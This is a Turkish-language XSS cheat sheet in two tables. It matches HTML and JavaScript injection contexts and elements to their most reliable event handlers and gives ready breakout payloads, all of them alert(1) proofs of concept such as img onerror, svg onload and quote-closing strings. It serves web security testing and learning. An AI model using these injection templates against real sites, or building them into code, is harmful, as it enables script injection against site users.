| #  | Context          | Örnek                       | JS Çalışır mı?        | Breakout? | Element Davranışı | En Stabil Event   | Strateji                  | Hazır Payload                             |
| -- | ---------------- | --------------------------- | --------------------- | --------- | ----------------- | ----------------- | ------------------------- | ----------------------------------------- |
| 1  | HTML Body        | `<div>USER</div>`           | ❌                     | ❌         | Sadece gösterir   | img → onerror     | JS tag ekle               | `<img src=x onerror=alert(1)>`            |
| 2  | HTML Body        | `<span>USER</span>`         | ❌                     | ❌         | Gösterir          | svg → onload      | JS tag ekle               | `<svg onload=alert(1)>`                   |
| 3  | Data Attribute   | `class="USER"`              | ❌                     | ✅         | Davranış yok      | div → onmouseover | Tırnak kapat + event      | `" onmouseover="alert(1)`                 |
| 4  | Data Attribute   | `id='USER'`                 | ❌                     | ✅         | Davranış yok      | div → onmouseover | Tırnak kapat + event      | `' onmouseover='alert(1)`                 |
| 5  | input value      | `value="USER"`              | ❌                     | ✅         | Focus alır        | input → onfocus   | Breakout + focus          | `" onfocus="alert(1) autofocus="`         |
| 6  | textarea         | `<textarea>USER</textarea>` | ❌                     | ✅         | Raw text          | img → onerror     | Tag kapat                 | `</textarea><img src=x onerror=alert(1)>` |
| 7  | img src          | `src="USER"`                | ❌                     | ✅         | Dosya yükler      | img → onerror     | Breakout + event          | `" onerror="alert(1)`                     |
| 8  | a href           | `href="USER"`               | ❌                     | ⚠         | Tıklanır          | a → onclick       | javascript: veya breakout | `javascript:alert(1)`                     |
| 9  | form action      | `action="USER"`             | ❌                     | ✅         | Submit eder       | form → onsubmit   | Breakout + event          | `" onsubmit="alert(1)`                    |
| 10 | JS attribute     | `onclick="USER"`            | ✅                     | ❌         | JS alanı          | —                 | Direkt JS                 | `alert(1)`                                |
| 11 | JS attr + string | `onclick="do('USER')"`      | ❌                     | ✅         | JS string         | —                 | String kapat              | `'); alert(1); //`                        |
| 12 | JS expression    | `var x = USER;`             | ✅                     | ❌         | JS alanı          | —                 | Direkt JS                 | `alert(1)`                                |
| 13 | JS string (")    | `"USER"`                    | ❌                     | ✅         | JS string         | —                 | String kapat              | `"; alert(1); //`                         |
| 14 | JS string (')    | `'USER'`                    | ❌                     | ✅         | JS string         | —                 | String kapat              | `'; alert(1); //`                         |
| 15 | DOM innerHTML    | `innerHTML=input`           | ❌ (HTML parse edilir) | ❌         | HTML parse        | img → onerror     | HTML injection            | `<img src=x onerror=alert(1)>`            |
| 16 | style/title      | `<style>USER</style>`       | ❌                     | ✅         | Raw text          | img → onerror     | Tag kapat                 | `</style><img src=x onerror=alert(1)>`    |
| 17 | iframe src       | `src="USER"`                | ❌                     | ✅         | Sayfa yükler      | iframe → onload   | Breakout + event          | `" onload="alert(1)`                      |
| 18 | button           | `<button USER>`             | ❌                     | ✅         | Tıklanır          | button → onclick  | Breakout + event          | `" onclick="alert(1)`                     |
| 19 | video/audio      | `src="USER"`                | ❌                     | ✅         | Medya yükler      | onerror           | Breakout + event          | `" onerror="alert(1)`                     |
| 20 | SVG injection    | HTML body                   | ❌                     | ❌         | Parse edilir      | svg → onload      | Direkt tag                | `<svg onload=alert(1)>`                   |


| Element            | Ne Yapar?      | En Stabil Event | Neden Bu Event?              | Örnek Payload (breakout sonrası)  |
| ------------------ | -------------- | --------------- | ---------------------------- | --------------------------------- |
| **img**            | Dosya yükler   | onerror         | Yükleme hatası tetiklenir    | `" onerror="alert(1)`             |
| **iframe**         | Sayfa yükler   | onload          | Yükleme tamamlanınca çalışır | `" onload="alert(1)`              |
| **video / audio**  | Medya yükler   | onerror         | Yükleme hatası               | `" onerror="alert(1)`             |
| **div / span / p** | Gösterim alanı | onmouseover     | Mouse her zaman gelebilir    | `" onmouseover="alert(1)`         |
| **input**          | Focus alır     | onfocus         | Focus garantili tetik        | `" onfocus="alert(1) autofocus="` |
| **textarea**       | Focus alır     | onfocus         | Focus alınabilir             | `" onfocus="alert(1)`             |
| **button**         | Tıklanır       | onclick         | Doğrudan click               | `" onclick="alert(1)`             |
| **a (link)**       | Tıklanır       | onclick         | Click event doğal            | `" onclick="alert(1)`             |
| **form**           | Submit edilir  | onsubmit        | Form submit tetikler         | `" onsubmit="alert(1)`            |
| **svg**            | Parse edilir   | onload          | Yüklenirken çalışır          | `<svg onload=alert(1)>`           |
| **body**           | Sayfa yüklenir | onload          | Sayfa açılırken çalışır      | `" onload="alert(1)`              |
